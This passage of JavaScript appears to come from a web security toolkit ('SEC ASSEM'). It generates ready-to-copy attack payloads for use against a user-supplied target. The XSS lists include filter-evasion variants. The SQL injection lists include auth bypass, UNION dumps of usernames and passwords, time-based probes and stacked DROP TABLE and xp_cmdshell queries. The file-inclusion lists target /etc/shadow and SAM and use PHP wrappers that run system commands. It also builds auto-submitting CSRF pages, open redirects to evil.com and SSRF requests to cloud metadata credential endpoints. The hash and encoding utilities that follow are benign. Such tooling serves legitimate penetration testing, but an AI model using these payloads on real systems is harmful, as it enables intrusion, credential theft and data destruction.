            });
            html += '</div>';
            document.getElementById('port-scanner-nmap').innerHTML = html;
        },

        /* ===== XSS Payload Generator ===== */
        xssGenerator() {
            const context = document.getElementById('xss-generator-context').value;
            const encoding = document.getElementById('xss-generator-encoding').value;

            const payloads = {
                html: [
                    '<script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                    '<svg/onload=alert(1)>',
                    '<body onload=alert(1)>',
                    '<details open ontoggle=alert(1)>',
                    '<input onfocus=alert(1) autofocus>',
                    '<marquee onstart=alert(1)>',
                    '<video src=x onerror=alert(1)>',
                    '<audio src=x onerror=alert(1)>',
                    '<iframe srcdoc="<script>alert(1)</script>">',
                    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
                    '<object data="javascript:alert(1)">',
                    '<embed src="javascript:alert(1)">',
                    '<xss onpointerrawupdate=alert(1) style=position:fixed;left:0;top:0;width:100%;height:100%>',
                    '<div onpointerover=alert(1)>Hover</div>',
                    '"><script>alert(1)</script>',
                    "'-alert(1)-'",
                    '<img src=x onerror="&#97;lert(1)">',
                    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                ],
                attribute: [
                    '" onmouseover="alert(1)',
                    "' onmouseover='alert(1)",
                    '" onfocus="alert(1)" autofocus="',
                    '" onmouseenter="alert(1)',
                    "' onfocus='alert(1)' autofocus='",
                    '" accesskey="x" onclick="alert(1)',
                    `" style="animation-name:x" onanimationstart="alert(1)`,
                    '" onbeforeinput="alert(1)" contenteditable',
                    "javascript:alert(1)",
                    "&#x6A;avascript:alert(1)",
                    "\" onload=\"alert(1)\"",
                    "' onload='alert(1)'",
                    '" autofocus onfocus=alert(1) x="',
                    `" tabindex="0" onfocus="alert(1)" id="x`,
                    "` onmouseover=alert(1)",
                    '"><img src=x onerror=alert(1)>',
                    "' onfocusin='alert(1)' autofocus='",
                    '" oncontextmenu=alert(1) x="',
                ],
                javascript: [
                    "'-alert(1)-'",
                    "';alert(1)//",
                    '";alert(1)//',
                    "\\';alert(1)//",
                    '\\"};alert(1)//',
                    "${alert(1)}",
                    "'-alert(1)+'",
                    "'+alert(1)+'",
                    '`-alert(1)-`',
                    "};alert(1)//",
                    "1;alert(1)",
                    "alert`1`",
                    "[].constructor.constructor('alert(1)')()",
                    "window['al'+'ert'](1)",
                    "self['alert'](1)",
                    "top['alert'](1)",
                    "eval('alert(1)')",
                    "Function('alert(1)')()",
                    "setTimeout('alert(1)')",
                    "setInterval('alert(1)')",
                ],
                url: [
                    "javascript:alert(1)",
                    "data:text/html,<script>alert(1)</script>",
                    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                    "javascript:alert(document.domain)",
                    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                    "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)",
                    "jAvAsCrIpT:alert(1)",
                    "JaVaScRiPt:alert(1)",
                    "%6A%61%76%61%73%63%72%69%70%74:alert(1)",
                    "\\x6aavascript:alert(1)",
                    "javascript&colon;alert(1)",
                    "java\nscript:alert(1)",
                    "java\tscript:alert(1)",
                    "java\x00script:alert(1)",
                ],
                event: [
                    'onmouseover=alert(1)',
                    'onfocus=alert(1) autofocus',
                    'onclick=alert(1)',
                    'onload=alert(1)',
                    'onerror=alert(1)',
                    'onmouseenter=alert(1)',
                    'onchange=alert(1)',
                    'oninput=alert(1)',
                    'onkeyup=alert(1)',
                    'onkeydown=alert(1)',
                    'ondblclick=alert(1)',
                    'oncontextmenu=alert(1)',
                    'ontoggle=alert(1)',
                    'onpointerenter=alert(1)',
                    'onbeforeinput=alert(1)',
                    'onanimationstart=alert(1)',
                    'onwheel=alert(1)',
                    'onfocusin=alert(1)',
                ],
            };

            let selected = payloads[context] || payloads.html;

            // Apply encoding
            if (encoding !== 'none') {
                selected = selected.map(p => {
                    if (encoding === 'url') return encodeURIComponent(p);
                    if (encoding === 'html') return p.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
                    if (encoding === 'base64') return btoa(p);
                    if (encoding === 'double-url') return encodeURIComponent(encodeURIComponent(p));
                    return p;
                });
            }

            document.getElementById('xss-generator-results').innerHTML =
                SecAssem.makePayloadList(selected, `XSS Payloads — ${context.toUpperCase()} Context (${encoding} encoding)`);
            SecAssem.showToast(`Generated ${selected.length} XSS payloads`, 'success');
        },

        /* ===== SQL Injection Payloads ===== */
        sqliGenerator() {
            const db = document.getElementById('sqli-generator-db').value;
            const technique = document.getElementById('sqli-generator-technique').value;

            const payloads = {
                'auth-bypass': [
                    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
                    "admin'--", "admin' #", "admin'/*", "' OR 1=1--", "' OR 1=1#",
                    "') OR ('1'='1", "') OR ('1'='1'--", "1' OR '1'='1'--",
                    "' OR ''='", "' OR 1=1 LIMIT 1--", "' UNION SELECT 1,1,1--",
                    "' OR 'x'='x", "') OR ('x'='x", "' OR username LIKE '%admin%'--",
                    "' OR 1=1 ORDER BY 1--", "admin' OR '1'='1'--",
                ],
                union: {
                    mysql: ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
                        "' UNION SELECT 1,2,3--", "' UNION SELECT username,password FROM users--",
                        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                        "' UNION SELECT CONCAT(username,':',password),NULL FROM users--",
                        "' UNION SELECT @@version,NULL--", "' UNION SELECT user(),database()--",
                        "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
                        "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
                        "' UNION SELECT load_file('/etc/passwd'),NULL--",
                        "1' ORDER BY 1-- -", "1' ORDER BY 10-- -",
                    ],
                    postgresql: ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                        "' UNION SELECT version(),NULL--", "' UNION SELECT current_user,NULL--",
                        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                        "' UNION SELECT username||':'||password,NULL FROM users--",
                    ],
                    mssql: ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                        "' UNION SELECT @@version,NULL--", "' UNION SELECT SYSTEM_USER,NULL--",
                        "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
                        "' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--",
                        "' UNION SELECT username+':'+password,NULL FROM users--",
                    ],
                    oracle: ["' UNION SELECT NULL FROM dual--", "' UNION SELECT NULL,NULL FROM dual--",
                        "' UNION SELECT banner,NULL FROM v$version--",
                        "' UNION SELECT table_name,NULL FROM all_tables--",
                        "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--",
                        "' UNION SELECT username||':'||password,NULL FROM users--",
                    ],
                    sqlite: ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                        "' UNION SELECT sqlite_version(),NULL--",
                        "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
                        "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--",
                    ],
                    generic: ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
                        "' UNION SELECT 1,2,3--", "0 UNION SELECT 1,2,3--",
                        "') UNION SELECT 1,2,3--", "') UNION SELECT NULL,NULL,NULL--",
                    ],
                },
                error: {
                    mysql: ["' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
                        "' AND exp(~(SELECT * FROM(SELECT version())x))--",
                        "' AND 1=CONVERT(version() USING utf8)--",
                    ],
                    postgresql: ["' AND 1=CAST(version() AS int)--",
                        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
                    ],
                    mssql: ["' AND 1=CONVERT(int,@@version)--", "' AND 1=CONVERT(int,db_name())--",
                        "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
                    ],
                    oracle: ["' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--",
                        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
                    ],
                    sqlite: ["' AND 1=CAST((SELECT sqlite_version()) AS int)--"],
                    generic: ["' AND 1=1--", "' AND 1=2--", "' AND (SELECT 1 FROM nonexistent)--"],
                },
                'blind-boolean': {
                    mysql: ["' AND 1=1--", "' AND 1=2--",
                        "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                        "' AND (SELECT COUNT(*) FROM users)>0--",
                        "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
                        "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)>97--",
                        "' AND (SELECT IF(1=1,1,0))=1--",
                    ],
                    postgresql: ["' AND 1=1--", "' AND 1=2--",
                        "' AND (SELECT SUBSTRING(version(),1,1))='P'--",
                    ],
                    mssql: ["' AND 1=1--", "' AND 1=2--",
                        "' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0--",
                    ],
                    oracle: ["' AND 1=1--", "' AND 1=2--",
                        "' AND (SELECT COUNT(*) FROM all_tables)>0--",
                    ],
                    sqlite: ["' AND 1=1--", "' AND 1=2--",
                        "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",
                    ],
                    generic: ["' AND 1=1--", "' AND 1=2--", "' AND 'a'='a'--", "' AND 'a'='b'--",
                        "' OR 1=1--", "' OR 1=2--"],
                },
                'blind-time': {
                    mysql: ["' AND SLEEP(5)--", "' AND IF(1=1,SLEEP(5),0)--",
                        "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
                        "' AND BENCHMARK(5000000,SHA1('test'))--",
                        "'; WAITFOR DELAY '0:0:5'--",
                    ],
                    postgresql: ["' AND pg_sleep(5)--", "'; SELECT pg_sleep(5)--",
                        "' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
                    ],
                    mssql: ["'; WAITFOR DELAY '0:0:5'--", "' AND 1=1 WAITFOR DELAY '0:0:5'--"],
                    oracle: ["' AND dbms_pipe.receive_message('a',5)=1--",
                        "' AND 1=(SELECT CASE WHEN 1=1 THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM dual)--",
                    ],
                    sqlite: ["' AND 1=randomblob(500000000)--"],
                    generic: ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--"],
                },
                stacked: {
                    mysql: ["'; DROP TABLE users--", "'; INSERT INTO users VALUES('hacker','hacked')--",
                        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                    ],
                    postgresql: ["'; DROP TABLE users--", "'; CREATE TABLE test(data text)--",
                        "'; COPY (SELECT version()) TO '/tmp/out'--",
                    ],
                    mssql: ["'; EXEC xp_cmdshell 'whoami'--", "'; EXEC sp_configure 'show advanced options',1--",
                        "'; DROP TABLE users--",
                    ],
                    oracle: ["'; EXECUTE IMMEDIATE 'DROP TABLE users'--"],
                    sqlite: ["'; DROP TABLE users--", "'; ATTACH DATABASE '/tmp/test.db' AS test--"],
                    generic: ["'; DROP TABLE users--", "'; INSERT INTO users VALUES('test','test')--"],
                },
            };

            let selected;
            if (technique === 'auth-bypass') {
                selected = payloads['auth-bypass'];
            } else {
                selected = payloads[technique]?.[db] || payloads[technique]?.generic || ["No payloads for this combination"];
            }

            document.getElementById('sqli-generator-results').innerHTML =
                SecAssem.makePayloadList(selected, `SQLi Payloads — ${db.toUpperCase()} / ${technique}`);
            SecAssem.showToast(`Generated ${selected.length} SQLi payloads`, 'success');
        },

        /* ===== LFI/RFI Payloads ===== */
        lfiGenerator() {
            const os = document.getElementById('lfi-generator-os').value;
            const technique = document.getElementById('lfi-generator-technique').value;

            const payloads = {
                basic: {
                    linux: ['../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd',
                        '../../../../../../etc/passwd', '../../../etc/shadow', '../../../etc/hosts',
                        '../../../etc/hostname', '../../../etc/issue', '../../../proc/self/environ',
                        '../../../proc/self/cmdline', '../../../proc/version', '../../../etc/crontab',
                        '../../../etc/ssh/sshd_config', '../../../var/log/auth.log', '../../../var/log/syslog'],
                    windows: ['..\\..\\..\\windows\\system.ini', '..\\..\\..\\windows\\win.ini',
                        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                        '..\\..\\..\\boot.ini', '..\\..\\..\\windows\\repair\\SAM',
                        '..\\..\\..\\windows\\repair\\system', '..\\..\\..\\windows\\php.ini',
                        '..\\..\\..\\windows\\system32\\config\\SAM',
                        '....//....//....//etc/passwd', '....\\\\....\\\\....\\\\windows\\\\win.ini'],
                },
                'null-byte': {
                    linux: ['../../../etc/passwd%00', '../../../etc/passwd%00.php', '../../../etc/passwd%00.html',
                        '../../../etc/passwd\x00', '....//....//....//etc/passwd%00'],
                    windows: ['..\\..\\..\\windows\\win.ini%00', '..\\..\\..\\boot.ini%00',
                        '..\\..\\..\\windows\\system.ini%00.php'],
                },
                'double-encoding': {
                    linux: ['%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
                        '..%252f..%252f..%252fetc%252fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                        '..%c0%af..%c0%af..%c0%afetc/passwd', '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
                        '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'],
                    windows: ['%252e%252e%255c%252e%252e%255cwindows%255cwin.ini',
                        '..%255c..%255c..%255cwindows%255cwin.ini'],
                },
                'filter-bypass': {
                    linux: ['....//....//....//etc/passwd', '....//...//../../../etc/passwd',
                        '..././..././..././etc/passwd', '..;/..;/..;/etc/passwd',
                        '..\\..\\..\\/etc/passwd', '/etc/passwd', 'etc/passwd',
                        '..%00/..%00/..%00/etc/passwd', '/%5C../%5C../%5C../etc/passwd'],
                    windows: ['....\\\\....\\\\....\\\\windows\\\\win.ini',
                        '..../..../..../windows/win.ini'],
                },
                'php-wrappers': {
                    linux: ['php://filter/convert.base64-encode/resource=/etc/passwd',
                        'php://filter/convert.base64-encode/resource=index.php',
                        'php://filter/read=string.rot13/resource=index.php',
                        'php://filter/zlib.deflate/convert.base64-encode/resource=index.php',
                        'php://input', 'data://text/plain,<?php system("id"); ?>',
                        'data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==',
                        'expect://id', 'phar://./archive.phar',
                        'php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php'],
                    windows: ['php://filter/convert.base64-encode/resource=C:\\windows\\win.ini',
                        'php://input', 'data://text/plain,<?php system("whoami"); ?>'],
                },
                'log-poisoning': {
                    linux: ['/var/log/apache2/access.log', '/var/log/apache2/error.log',
                        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
                        '/var/log/auth.log', '/var/log/mail.log', '/var/log/vsftpd.log',
                        '/var/log/sshd.log', '/proc/self/fd/0', '/proc/self/fd/1',
                        '/proc/self/fd/2', '/var/lib/php/sessions/sess_[SESSION_ID]',
                        '/tmp/sess_[SESSION_ID]', '/var/log/httpd/access_log',
                        '/var/log/httpd/error_log'],
                    windows: ['C:\\xampp\\apache\\logs\\access.log', 'C:\\xampp\\apache\\logs\\error.log',
                        'C:\\inetpub\\logs\\LogFiles\\', 'C:\\Windows\\Temp\\php-errors.log',
                        'C:\\Windows\\System32\\LogFiles\\'],
                },
            };

            const selected = payloads[technique]?.[os] || ['No payloads for this combination'];
            document.getElementById('lfi-generator-results').innerHTML =
                SecAssem.makePayloadList(selected, `LFI/RFI Payloads — ${os.toUpperCase()} / ${technique}`);
            SecAssem.showToast(`Generated ${selected.length} LFI payloads`, 'success');
        },

        /* ===== CSRF PoC Generator ===== */
        csrfGenerator() {
            const url = document.getElementById('csrf-generator-url').value.trim();
            const method = document.getElementById('csrf-generator-method').value;
            const names = document.getElementById('csrf-generator-names').value.trim().split('\n').filter(Boolean);
            const values = document.getElementById('csrf-generator-values').value.trim().split('\n').filter(Boolean);
            const autoSubmit = document.getElementById('csrf-generator-autosubmit').checked;

            if (!url) { SecAssem.showToast('Please enter a target URL', 'warning'); return; }

            let formFields = '';
            names.forEach((n, i) => {
                formFields += `      <input type="hidden" name="${SecAssem.escapeHtml(n.trim())}" value="${SecAssem.escapeHtml((values[i] || '').trim())}" />\n`;
            });

            const poc = `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC — SEC ASSEM</title>
</head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <p>Generated by SEC ASSEM Cybersecurity Toolkit</p>
  <form id="csrf-form" action="${SecAssem.escapeHtml(url)}" method="${method}">
${formFields}    <input type="submit" value="Submit" />
  </form>
${autoSubmit ? '  <script>document.getElementById("csrf-form").submit();</script>' : ''}
</body>
</html>`;

            let html = `<div class="result-header"><h4>CSRF PoC Generated</h4>
                <button class="btn-secondary btn-sm" onclick="SecAssem.copyToClipboard(document.getElementById('csrf-code').textContent)">📋 Copy</button>
                <button class="btn-secondary btn-sm" onclick="SecAssem.downloadFile('csrf_poc.html', document.getElementById('csrf-code').textContent, 'text/html')">⬇ Download</button></div>
                <pre class="code-block" id="csrf-code">${SecAssem.escapeHtml(poc)}</pre>`;
            document.getElementById('csrf-generator-results').innerHTML = html;
            SecAssem.showToast('CSRF PoC generated', 'success');
        },

        /* ===== Open Redirect Payloads ===== */
        redirectGenerator() {
            const evil = document.getElementById('redirect-generator-url').value.trim() || 'https://evil.com';
            const domain = evil.replace(/^https?:\/\//, '');
            const payloads = [
                `//${domain}`, `\\${domain}`, `\/${domain}`, `////${domain}`,
                `/\\/${domain}`, `@${domain}`, `%2f%2f${domain}`,
                `%5c${domain}`, `%2f${domain}`, `/%09/${domain}`,
                `/%2f%2f${domain}`, `//%5c${domain}`, `/////${domain}`,
                `?next=${evil}`, `?url=${evil}`, `?redirect=${evil}`,
                `?dest=${evil}`, `?rurl=${evil}`, `?return=${evil}`,
                `?return_to=${evil}`, `?checkout_url=${evil}`,
                `?continue=${evil}`, `?redirect_uri=${evil}`,
                `?target=${evil}`, `?redir=${evil}`,
                `${evil}%23.legitimate.com`, `${evil}%40legitimate.com`,
                `${evil}?.legitimate.com`, `${evil}#.legitimate.com`,
                `javascript:window.location='${evil}'`,
                `data:text/html;base64,${btoa(`<script>window.location='${evil}'</script>`)}`,
            ];
            document.getElementById('redirect-generator-results').innerHTML =
                SecAssem.makePayloadList(payloads, `Open Redirect Payloads → ${SecAssem.escapeHtml(evil)}`);
            SecAssem.showToast(`Generated ${payloads.length} redirect payloads`, 'success');
        },

        /* ===== SSRF Payloads ===== */
        ssrfGenerator() {
            const ip = document.getElementById('ssrf-generator-ip').value.trim() || '127.0.0.1';
            const port = document.getElementById('ssrf-generator-port').value.trim() || '80';
            const parts = ip.split('.').map(Number);
            const decimal = parts.length === 4 ? ((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]) >>> 0 : 2130706433;
            const hex = '0x' + parts.map(p => p.toString(16).padStart(2, '0')).join('');
            const octal = parts.map(p => '0' + p.toString(8)).join('.');

            const payloads = [
                `http://${ip}:${port}`, `http://localhost:${port}`, `http://[::1]:${port}`,
                `http://127.1:${port}`, `http://0:${port}`, `http://0.0.0.0:${port}`,
                `http://${decimal}:${port}`, `http://${hex}:${port}`, `http://${octal}:${port}`,
                `http://127.0.0.1.nip.io:${port}`, `http://spoofed.burpcollaborator.net`,
                `http://[::ffff:${ip}]:${port}`, `http://[0:0:0:0:0:ffff:${ip}]:${port}`,
                `http://①②⑦.⓪.⓪.①:${port}`, `http://localtest.me:${port}`,
                `gopher://${ip}:${port}/_`, `dict://${ip}:${port}/info`,
                `sftp://${ip}:${port}`, `tftp://${ip}:${port}`,
                `ldap://${ip}:${port}`, `file:///etc/passwd`,
                `http://169.254.169.254/latest/meta-data/`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
                `http://169.254.169.254/latest/user-data/`,
                `http://metadata.google.internal/computeMetadata/v1/`,
                `http://100.100.100.200/latest/meta-data/`,
                `http://169.254.169.254/metadata/v1/`,
                `http://${ip}:${port}#@legitimate.com`,
                `http://legitimate.com@${ip}:${port}`,
            ];
            document.getElementById('ssrf-generator-results').innerHTML =
                SecAssem.makePayloadList(payloads, `SSRF Payloads → ${ip}:${port}`);
            SecAssem.showToast(`Generated ${payloads.length} SSRF payloads`, 'success');
        },

        /* ===== Hash Generator ===== */
        async hashGenerator() {
            const text = document.getElementById('hash-generator-text').value;
            if (!text) { SecAssem.showToast('Please enter text to hash', 'warning'); return; }
            SecAssem.showLoading('hash-generator-results');
            try {
                const md5Hash = SecAssem.md5(text);
                const sha1Hash = await SecAssem.sha('SHA-1', text);
                const sha256Hash = await SecAssem.sha('SHA-256', text);
                const sha384Hash = await SecAssem.sha('SHA-384', text);
                const sha512Hash = await SecAssem.sha('SHA-512', text);

                const hashes = [
                    { algo: 'MD5', hash: md5Hash },
                    { algo: 'SHA-1', hash: sha1Hash },
                    { algo: 'SHA-256', hash: sha256Hash },
                    { algo: 'SHA-384', hash: sha384Hash },
                    { algo: 'SHA-512', hash: sha512Hash },
                ];
                let html = `<div class="result-header"><h4>Hashes</h4></div>`;
                html += `<table class="data-table"><thead><tr><th>Algorithm</th><th>Hash</th><th></th></tr></thead><tbody>`;
                hashes.forEach(h => {
                    html += `<tr><td><strong>${h.algo}</strong></td><td><code class="hash-value">${h.hash}</code></td>
                        <td><button class="copy-btn" onclick="SecAssem.copyToClipboard('${h.hash}')">📋</button></td></tr>`;
                });
                html += '</tbody></table>';
                document.getElementById('hash-generator-results').innerHTML = html;
            } catch (e) {
                SecAssem.showToast('Hash generation failed: ' + e.message, 'error');
            }
        },

        /* ===== Encoder/Decoder ===== */
        encoderDecoder() {
            const input = document.getElementById('encoder-decoder-input').value;
            const type = document.getElementById('encoder-decoder-type').value;
            const mode = SecAssem.activeTab['encoder-decoder'] || 'encode';
            if (!input) { SecAssem.showToast('Please enter text', 'warning'); return; }

            let result = '';
            try {
                if (mode === 'encode') {
                    switch (type) {
                        case 'base64': result = btoa(unescape(encodeURIComponent(input))); break;
                        case 'url': result = encodeURIComponent(input); break;
                        case 'html': result = input.replace(/[&<>"'\/]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '/': '&#x2F;' }[c])); break;
                        case 'hex': result = Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' '); break;
                        case 'binary': result = Array.from(input).map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '); break;
                        case 'rot13': result = input.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))); break;
                        case 'unicode': result = Array.from(input).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''); break;
                    }
                } else {
                    switch (type) {
                        case 'base64': result = decodeURIComponent(escape(atob(input))); break;
                        case 'url': result = decodeURIComponent(input); break;
                        case 'html': { const t = document.createElement('textarea'); t.innerHTML = input; result = t.value; break; }
                        case 'hex': result = input.split(' ').map(h => String.fromCharCode(parseInt(h, 16))).join(''); break;
                        case 'binary': result = input.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join(''); break;
                        case 'rot13': result = input.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))); break;
                        case 'unicode': result = input.replace(/\\u([0-9a-fA-F]{4})/g, (_, c) => String.fromCharCode(parseInt(c, 16))); break;
                    }
                }
            } catch (e) { result = 'Error: Invalid input for this encoding type'; }

            document.getElementById('encoder-decoder-results').innerHTML =
                `<div class="result-header"><h4>${mode === 'encode' ? 'Encoded' : 'Decoded'} (${type})</h4>
                <button class="copy-btn" onclick="SecAssem.copyToClipboard(document.getElementById('enc-result').textContent)">📋 Copy</button></div>
                <pre class="code-block" id="enc-result">${SecAssem.escapeHtml(result)}</pre>`;
        },

        /* ===== JWT Decoder ===== */
        jwtDecoder() {
            const token = document.getElementById('jwt-decoder-token').value.trim();
            if (!token) { SecAssem.showToast('Please enter a JWT token', 'warning'); return; }
            try {
                const parts = token.split('.');
                if (parts.length !== 3) throw new Error('Invalid JWT format (expected 3 parts)');

                const b64decode = s => decodeURIComponent(escape(atob(s.replace(/-/g, '+').replace(/_/g, '/'))));
                const header = JSON.parse(b64decode(parts[0]));
                const payload = JSON.parse(b64decode(parts[1]));

                let expStatus = '';
                if (payload.exp) {
                    const expDate = new Date(payload.exp * 1000);
                    const now = new Date();
                    expStatus = expDate < now
                        ? `<span class="badge severity-critical">EXPIRED (${expDate.toISOString()})</span>`
                        : `<span class="badge severity-low">Valid until ${expDate.toISOString()}</span>`;
                }

                let iatInfo = '';
                if (payload.iat) iatInfo = `<p><strong>Issued At:</strong> ${new Date(payload.iat * 1000).toISOString()}</p>`;

                document.getElementById('jwt-decoder-results').innerHTML = `
                    <div class="result-header"><h4>JWT Decoded</h4></div>
                    ${expStatus ? `<div style="margin-bottom:12px">${expStatus}</div>` : ''}
                    ${iatInfo}
                    <h4>Header</h4>
                    <pre class="code-block json">${SecAssem.escapeHtml(JSON.stringify(header, null, 2))}</pre>
                    <h4>Payload</h4>
                    <pre class="code-block json">${SecAssem.escapeHtml(JSON.stringify(payload, null, 2))}</pre>
                    <h4>Signature</h4>
                    <pre class="code-block">${SecAssem.escapeHtml(parts[2])}</pre>`;
            } catch (e) {
                SecAssem.showToast('JWT decode failed: ' + e.message, 'error');
                document.getElementById('jwt-decoder-results').innerHTML = `<p class="no-results">Invalid JWT token: ${SecAssem.escapeHtml(e.message)}</p>`;
            }
        },

        /* ===== Hash Identifier ===== */
        hashIdentifier() {
            const hash = document.getElementById('hash-identifier-hash').value.trim();
            if (!hash) { SecAssem.showToast('Please enter a hash', 'warning'); return; }

            const results = [];
            const len = hash.length;
            const isHex = /^[a-fA-F0-9]+$/.test(hash);

            if (hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$'))
                results.push({ type: 'bcrypt', confidence: 'High', hashcat: '3200', john: 'bcrypt' });
            if (hash.startsWith('$1$'))
                results.push({ type: 'MD5 (Unix)', confidence: 'High', hashcat: '500', john: 'md5crypt' });
            if (hash.startsWith('$5$'))
                results.push({ type: 'SHA-256 (Unix)', confidence: 'High', hashcat: '7400', john: 'sha256crypt' });
            if (hash.startsWith('$6$'))
                results.push({ type: 'SHA-512 (Unix)', confidence: 'High', hashcat: '1800', john: 'sha512crypt' });
            if (hash.startsWith('$argon2'))
                results.push({ type: 'Argon2', confidence: 'High', hashcat: '-', john: 'argon2' });
            if (hash.startsWith('$apr1$'))
                results.push({ type: 'MD5 (APR)', confidence: 'High', hashcat: '1600', john: 'md5apr1' });
            if (hash.startsWith('pbkdf2'))
                results.push({ type: 'PBKDF2', confidence: 'High', hashcat: '-', john: 'PBKDF2' });

            if (isHex) {
                if (len === 32) results.push({ type: 'MD5', confidence: 'High', hashcat: '0', john: 'raw-md5' },
                    { type: 'NTLM', confidence: 'Medium', hashcat: '1000', john: 'NT' });
                if (len === 40) results.push({ type: 'SHA-1', confidence: 'High', hashcat: '100', john: 'raw-sha1' },
                    { type: 'MySQL 4.1+', confidence: 'Medium', hashcat: '300', john: 'mysql-sha1' });
                if (len === 56) results.push({ type: 'SHA-224', confidence: 'High', hashcat: '-', john: 'raw-sha224' });
                if (len === 64) results.push({ type: 'SHA-256', confidence: 'High', hashcat: '1400', john: 'raw-sha256' },
                    { type: 'RIPEMD-256', confidence: 'Low', hashcat: '-', john: '-' });
                if (len === 96) results.push({ type: 'SHA-384', confidence: 'High', hashcat: '10800', john: 'raw-sha384' });
                if (len === 128) results.push({ type: 'SHA-512', confidence: 'High', hashcat: '1700', john: 'raw-sha512' },
                    { type: 'Whirlpool', confidence: 'Low', hashcat: '6100', john: 'whirlpool' });
            }

            if (!results.length) results.push({ type: 'Unknown', confidence: 'N/A', hashcat: '-', john: '-' });

            let html = `<div class="result-header"><h4>Hash Identification</h4></div>
                <p><strong>Input:</strong> <code>${SecAssem.escapeHtml(hash)}</code></p>
                <p><strong>Length:</strong> ${len} characters</p>
                <table class="data-table"><thead><tr><th>Type</th><th>Confidence</th><th>Hashcat Mode</th><th>John Format</th></tr></thead><tbody>`;
            results.forEach(r => {
                const confClass = { High: 'severity-low', Medium: 'severity-medium', Low: 'severity-high' }[r.confidence] || 'severity-info';
                html += `<tr><td><strong>${r.type}</strong></td><td><span class="badge ${confClass}">${r.confidence}</span></td>
                    <td><code>${r.hashcat}</code></td><td><code>${r.john}</code></td></tr>`;
            });
            html += '</tbody></table>';
            document.getElementById('hash-identifier-results').innerHTML = html;
        },

        /* ===== Password Generator ===== */
        passwordGenerator() {
            const length = parseInt(document.getElementById('password-generator-length').value);
            const useUpper = document.getElementById('password-generator-upper').checked;
            const useLower = document.getElementById('password-generator-lower').checked;
            const useNumbers = document.getElementById('password-generator-numbers').checked;
